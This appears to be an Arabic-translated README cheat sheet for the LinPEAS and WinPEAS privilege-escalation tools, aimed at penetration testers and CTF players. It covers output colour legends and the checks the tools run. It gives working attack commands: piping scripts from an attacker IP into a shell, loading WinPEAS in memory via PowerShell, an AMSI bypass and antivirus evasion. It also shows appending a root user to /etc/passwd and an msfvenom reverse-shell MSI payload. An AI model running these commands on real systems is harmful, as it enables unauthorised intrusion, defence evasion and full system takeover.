<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🦹 PEASS-ng (LinPEAS & WinPEAS) - ورقة الغش الكاملة

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██████╗ ███████╗ █████╗ ███████╗███████╗      ███╗   ██╗ ██████╗ 
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝      ████╗  ██║██╔════╝ 
  ██████╔╝█████╗  ███████║███████╗███████╗█████╗██╔██╗ ██║██║  ███╗
  ██╔═══╝ ██╔══╝  ██╔══██║╚════██║╚════██║╚════╝██║╚██╗██║██║   ██║
  ██║     ███████╗██║  ██║███████║███████║      ██║ ╚████║╚██████╔╝
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝      ╚═╝  ╚═══╝ ╚═════╝ 
             LinPEAS & WinPEAS Privilege Escalation Suite
```
<p align="center">
  <img src="https://img.shields.io/badge/PEASS--ng-PrivEsc-red?style=for-the-badge" alt="PEASS-ng">
  <img src="https://img.shields.io/badge/LinPEAS-Linux_PrivEsc-blue?style=for-the-badge" alt="LinPEAS">
  <img src="https://img.shields.io/badge/WinPEAS-Windows_PrivEsc-orange?style=for-the-badge" alt="WinPEAS">
  <img src="https://img.shields.io/badge/Automated-Enumeration-green?style=for-the-badge" alt="Automated">
</ص>

<p align="center">
  <b>🔍 أدوات تصعيد الامتيازات الآلية الأكثر شيوعًا على مستوى العالم لأنظمة Linux وWindows</b>
</ص>

---

## 📋 جدول المحتويات

- [المقدمة](#-المقدمة)
- [أسطورة الألوان وكيفية قراءة المخرجات](#-أسطورة الألوان--كيفية قراءة المخرجات)
- [LinPEAS (تصعيد امتيازات Linux)](#-linpeas-linux-privilege-escalation)
  - [التنزيل والتنفيذ داخل الذاكرة](#download--in-memory-execution)
  - [خيارات سطر الأوامر](#command-line-options)
  - [تم فحص المتجهات الأساسية بواسطة LinPEAS](#core-vectors-checked-by-linpeas)
  - [التسلل والتهرب من AV](#stealth--av-evasion)
- [WinPEAS (تصعيد امتيازات Windows)](#-winpeas-windows-privilege-escalation)
  - [طرق التنفيذ (.exe vs.bat)](#execution-methods-exe-vs-bat)
  - [تشغيل WinPEAS في الذاكرة](#running-winpeas-in-memory)
  - [تم فحص المتجهات الأساسية بواسطة WinPEAS](#core-vectors-checked-by-winpeas)
  - [تجاوز Windows Defender وAMSI](#bypassing-windows-defender--amsi)
- [تفسير النتائج ذات الأولوية العالية](#-تفسير-النتائج ذات الأولوية العالية)
- [الجدول المرجعي السريع](#-الجدول المرجعي السريع)
- [النصائح وأفضل الممارسات](#-نصائح--أفضل-الممارسات)
- [إخلاء المسؤولية القانونية](#-إخلاء المسؤولية القانونية)
- [الموارد](#-الموارد)

---

## 🎯 المقدمة

**PEASS-ng** (مجموعة البرامج النصية الرائعة لتصعيد الامتيازات - الجيل الجديد)، التي أنشأها كارلوس بولوب، هي مجموعة قياسية فعلية من أدوات التدقيق الآلية المستخدمة للكشف عن متجهات تصعيد الامتيازات على الأنظمة المخترقة:

- **LinPEAS:** برنامج نصي Bash شامل يبحث عن التكوينات الخاطئة، وبيانات الاعتماد، والملفات القابلة للكتابة، وثنائيات SUID، وعمليات استغلال kernel، ووظائف cron، والحاويات على أنظمة Linux/Unix.
- **WinPEAS:** متوفر كبرنامج .NET ثنائي مستقل ومترجم (`winPEASany.exe`، `winPEASx64.exe`) وبرنامج نصي دفعي خفيف الوزن (`winPEAS.bat`) لتدقيق محطات عمل Windows وأعضاء المجال والخوادم.

---

## 🎨 أسطورة الألوان وكيفية قراءة المخرجات

القوة المميزة لـ PEASS هي نظام تصنيف الألوان الآلي الخاص بها:

| اللون | الأهمية | معنى |
|-------|-------------|---------|
| 🔴 **أحمر/أصفر** | 🚨 **حرج (99% خصوصية)** | ناقل تصعيد الامتيازات الموثوق به للغاية. يجب التحقق على الفور! |
| 🔴 **أحمر** | ⚠️ **مثير للاهتمام** | تكوين غير عادي، أو إعداد غير افتراضي، أو مرشح بيانات الاعتماد. |
| 🟡 **أصفر** | ℹ️ **معلوماتية** | اكتشاف ملحوظ قد يكون جزءًا من سلسلة استغلال. |
| 🔵 **سماوي/أزرق** | 👥 **السياق** | المستخدمون والمجموعات ومعلومات النظام القياسية. |

> **القاعدة الذهبية:** قم بالتمرير مباشرةً إلى النقاط المميزة **الأحمر/الأصفر** أولاً! إذا رأيت نصًا بخلفية صفراء وأحرف حمراء، فهذا يعني أن ناقل الاستغلال مضمون تقريبًا.

---

## 🐧 LinPEAS (تصعيد امتيازات Linux)

### التنزيل والتنفيذ في الذاكرة

نادرًا ما تحتاج إلى كتابة `linpeas.sh` على القرص. قم بتنفيذه مباشرة في الذاكرة باستخدام أدوات UNIX القياسية:
```bash
# 1. From attacker Python web server directly into bash
curl -L http://10.10.14.5:8000/linpeas.sh | sh

# Alternative using wget
wget -q -O - http://10.10.14.5:8000/linpeas.sh | sh

# 2. Download from official GitHub directly (if target has outbound internet access)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 3. Save output to file and review with colors preserved
./linpeas.sh -a > /tmp/linpeas.txt
less -r /tmp/linpeas.txt
```
### خيارات سطر الأوامر
```bash
# Run all checks (including slower exhaustive searches)
./linpeas.sh -a

# Fast mode (skips slow regex / deep file checks)
./linpeas.sh -q

# Password provided for automated 'sudo -l' testing
./linpeas.sh -p 'KnownPassword123'

# Network-only checks (active connections, ARP cache, listening ports)
./linpeas.sh -N

# System information only
./linpeas.sh -s
```
### تم فحص المتجهات الأساسية بواسطة LinPEAS

1. ** تكوينات سودو الخاطئة (`sudo -l`):**
   - أوامر قابلة للتشغيل كجذر بدون كلمة مرور (`NOPASSWD`).
   - إعادة استخدام رمز Sudo / CVE-2021-3156 (Baron Samedit).
2. **ثنائيات SUID / SGID:**
   - الثنائيات مع أذونات الجذر (`chmod +s`). تمت الإشارة إليه مقابل **GTFOBins**.
3. **قدرات نظام التشغيل Linux:**
   - ثنائيات ذات إمكانيات مرتفعة مثل `cap_setuid+ep` (على سبيل المثال، `python3`، `tar`، `perl`).
4. **المهام المجدولة والموقتات:**
   - Crontabs (`/etc/crontab`، `/var/spool/cron/*`) والنصوص المجدولة القابلة للكتابة.
   - مؤقتات النظام (`systemctl list-timers`).
5. **اختطاف المسار والبيئة:**
   - الدلائل القابلة للكتابة في `$PATH`، وعمليات البحث عن الأوامر النسبية في البرامج النصية.
6. **استغلال النواة:**
   - تم فحص إصدار Kernel ضد الثغرات المعروفة (Dirty COW، Dirty Pipe، OverlayFS).
7. **سحق جذر NFS:**
   - الدلائل المشتركة المثبتة مع `no_root_squash` في `/etc/exports`.
8. **حصاد بيانات الاعتماد:**
   - كلمات مرور النص الواضح في `.bash_history`، وملفات التكوين (`wp-config.php`، `.env`)، ومفاتيح SSH (`id_rsa`)، ومقالب الذاكرة.

---

## 🪟 WinPEAS (تصعيد امتيازات Windows)

### طرق التنفيذ (.exe مقابل .bat)

يتم توفير WinPEAS بتنسيقات متعددة:
- **`winPEASx64.exe` / `winPEASany.exe`:** مكتوب بلغة C#/.NET. الأكثر شمولاً؛ يقوم بإجراء فحوصات عميقة للتسجيل وواجهة برمجة التطبيقات وبيانات الاعتماد.
- **`winPEAS.bat`:** برنامج نصي دفعي عادي. متوافق بشكل كبير مع إصدارات Windows القديمة، ولا يتطلب أي تبعيات .NET، ويتجنب بعض الاكتشافات الثنائية الثابتة.
```cmd
:: Run winPEAS binary with full color output
winPEASx64.exe

:: Run stealthily and redirect to text file
winPEASx64.exe > C:\Windows\Temp\out.txt

:: Fast check without heavy registry and file searches
winPEASx64.exe quiet
```
### تشغيل WinPEAS في الذاكرة

لتجنب حفظ الملفات على القرص على محطات العمل التي تم تدقيقها، قم بتحميل WinPEAS مباشرة إلى ذاكرة PowerShell:
```powershell
# In-memory execution using Net.WebClient
$pe = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.5:8000/winPEASx64.exe')
[System.Reflection.Assembly]::Load($pe)
[winPEAS.Program]::Main("")
```
### فحص المتجهات الأساسية بواسطة WinPEAS

1. **أذونات الخدمة والمسارات غير المقتبسة:**
   - **مسارات الخدمة غير المقتبسة:** مسارات الخدمة الثنائية بمسافات وبدون علامات اقتباس (`C:\Program Files\App\service.exe` -> أماكن المهاجم `C:\Program.exe`).
   - **أذونات الخدمة الضعيفة:** المستخدمون غير الإداريين الذين لديهم `SERVICE_ALL_ACCESS` أو `SERVICE_CHANGE_CONFIG`.
2. **اختطاف ملف DLL:**
   - الخدمات التي تحاول تحميل ملفات DLL غير الموجودة من الدلائل القابلة للكتابة بواسطة المستخدم.
3. **التثبيت دائمًا مرتفع:**
   - مفاتيح التسجيل `AlwaysInstallElevated = 1` التي تسمح لأي مستخدم بتثبيت حزم MSI مرتفعة مع `msiexec`.
4. **امتيازات الرمز المميز (SeImpersonate / SeAssignPrimaryToken):**
   - قابل للاستغلال عبر عمليات استغلال البطاطس (SweetPotato، GodPotato، PrintSpoofer) للارتقاء من حسابات الخدمة (`IIS APPPOOL`، `LOCAL SERVICE`) إلى `NT AUTHORITY\SYSTEM`.
5. **مخازن بيانات الاعتماد والتسجيل التلقائي:**
   - كلمات مرور Cleartext في التسجيل (`DefaultPassword` في Winlogon).
   - اتصالات RDP المحفوظة، وبيانات اعتماد Vault، ونقاط DPAPI، وجلسات PuTTY، وكلمات مرور WiFi.
6. **ملفات النسخ الاحتياطي لـ SAM والنظام:**
   - نسخ قابلة للكتابة أو القراءة من `C:\Windows\Repair\SAM` أو `C:\Windows\System32\config\RegBack\SAM`.

### تجاوز Windows Defender وAMSI

يقوم Windows Defender بوضع علامة نشطة على الإصدارات المترجمة من `winPEASx64.exe`. لتشغيل WinPEAS في البيئات المراقبة:
```powershell
# 1. Obfuscate winPEAS binary using Invisibility / Donut or custom compiler
# 2. Patch AMSI in PowerShell session before running in memory:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 3. Alternatively, fall back to winPEAS.bat (often unflagged by AV):
curl.exe http://10.10.14.5:8000/winPEAS.bat -o %TEMP%\wp.bat && %TEMP%\wp.bat
```
---

## 🎯 تفسير النتائج ذات الأولوية العالية

### 1. LinPEAS: `/etc/passwd` قابل للكتابة
إذا قام LinPEAS بوضع علامة على `/etc/passwd` باللون **RED/YELLOW**:
```bash
# Generate password hash:
openssl passwd -1 -salt evil SaltPass123
# Append root user:
echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2
```
### 2. WinPEAS: `SeImpersonatePrivilege` موجود
إذا كنت تحمل `SeImpersonatePrivilege`:
```powershell
# Elevate instantly using GodPotato or PrintSpoofer:
.\GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
```
### 3. WinPEAS: `AlwaysInstallElevated` اضبط على 1
```powershell
# Generate malicious MSI payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o priv.msi
# Run installer as low-privileged user:
msiexec /quiet /qn /i priv.msi
```
---

## 📊 جدول مرجعي سريع

| الهدف | الأمر | الغرض |
|--------|---------|---------|
| **لينكس (عن بعد)** | `curl -L http://<IP>/linpeas.sh \| sh` | التنفيذ في الذاكرة دون لمس القرص |
| **لينكس (محلي)** | `./linpeas.sh -a > out.txt` | تم حفظ التدقيق الكامل في ملف نصي |
| **لينكس (سريع)** | `./linpeas.sh -q` | مسح سريع يتخطى عمليات البحث البطيئة عن الملفات |
| **ويندوز (CLI)** | `winPEASx64.exe quiet` | تنفيذ سريع مع ضوضاء أقل |
| **ويندوز (الذاكرة)**| `[System.Reflection.Assembly]::Load($pe)` | قم بتحميل .NET الثنائي في الذاكرة عبر PowerShell |
| ** ويندوز (دفعة) ** | `winPEAS.bat` | تنفيذ خالي من التبعية للتهرب من الإرث/AV |

---

## 💡 النصائح وأفضل الممارسات

1. **مراجعة الإخراج باستخدام `less -r`:**
   عند إعادة توجيه الإخراج إلى ملف (`./linpeas.sh > linpeas.txt`)، اعرضه دائمًا باستخدام `less -r linpeas.txt` أو `cat linpeas.txt` حتى يتم عرض رموز هروب الألوان الطرفية ANSI بشكل صحيح.
2. **التحويل عبر المنفذ 80/443:**
   عند تنظيم LinPEAS أو WinPEAS على صندوق المهاجم، قم باستضافة خادم الويب الخاص بك على المنفذ `80` أو `443` باستخدام `python3 -m http.server 80` لتجاوز قواعد الخروج الصارمة لجدار الحماية المستهدف.
3. **لا تتجاهل بيانات الاعتماد المخفية:**
   تحقق من قسمي "الملفات المثيرة للاهتمام" و"بيانات اعتماد السحابة" في إخراج LinPEAS؛ غالبًا ما تمنح الرموز المميزة لواجهة برمجة التطبيقات ذات النص العادي أو بيانات اعتماد AWS امتيازات أعلى من الاستغلال المحلي.

---

## ⚠️إخلاء المسؤولية القانونية

> **هام:** تقوم البرامج النصية PEASS-ng بإجراء تدقيق داخلي شامل واكتشاف التكوين. ويجب تنفيذها فقط على الأنظمة التي لديك إذن موثق بها أثناء اختبارات الاختراق المصرح بها، أو تمارين CTF، أو عمليات تدقيق الأمن الداخلي.

---

## 📚 المصادر

- [مستودع PEASS-ng الرسمي على GitHub](https://github.com/carlospolop/PEASS-ng)
- [الكتاب المقدس لسحابة HackTricks وتصعيد الامتيازات](https://book.hacktricks.xyz/)
- [GTFOBins - استغلال ثنائيات Unix](https://gtfobins.github.io/)
- [LOLBAS - Windows Living Off The Land](https://lolbas-project.github.io/)